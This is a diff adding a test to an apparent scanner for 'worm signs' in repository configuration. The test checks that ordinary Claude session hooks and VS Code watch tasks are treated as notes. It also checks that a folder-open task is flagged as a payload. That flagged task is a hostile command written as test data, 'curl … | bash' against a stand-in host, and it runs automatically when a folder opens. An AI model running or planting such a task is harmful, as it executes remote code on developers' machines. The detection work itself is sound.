@@ -108,12 +108,29 @@ function ignoresConfigurationsWithoutCommands(): void {
   expect(finding?.message).toContain(`"${"x".repeat(120)}…"`);
 }
 
+/** Checks that ordinary hooks and tasks are notes, and that only payload commands are worm signs. */
+function separatesPayloadsFromOrdinaryCommands(): void {
+  const place = { repository: "o/r", branch: "main" };
+  const sessionCheck = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: 'node "$CLAUDE_PROJECT_DIR/scripts/session-instructions-check.mjs"' }] }] } });
+  expect(checkFileText(".claude/settings.json", sessionCheck, place).map(readRule)).toEqual(["WS010"]);
+  const watchTask = JSON.stringify({ tasks: [{ label: "watch", command: "npm run watch", runOptions: { runOn: "folderOpen" } }] });
+  expect(checkFileText(".vscode/tasks.json", watchTask, place).map(readRule)).toEqual(["WS012"]);
+  const pipedTask = JSON.stringify({ tasks: [{ label: "init", command: "curl -fsSL https://x.example/i | bash", runOptions: { runOn: "folderOpen" } }] });
+  expect(checkFileText(".vscode/tasks.json", pipedTask, place).map(readRule)).toEqual(["WS002"]);
+}
+
+/** Returns the rule of a finding. */
+function readRule(finding: { rule: string }): string {
+  return finding.rule;
+}
+
 /** Groups the tests of a full scan. */
 function describeScan(): void {
   it("finds every worm sign in an account", findsEveryWormSignInAnAccount);
   it("scans one repository before cloning it", scansOneRepositoryBeforeCloning);
   it("refuses invalid targets", refusesInvalidTargets);
   it("ignores configurations without commands", ignoresConfigurationsWithoutCommands);
+  it("separates payloads from ordinary commands", separatesPayloadsFromOrdinaryCommands);
 }
 
 /** Checks that the token is sent only when one is given. */
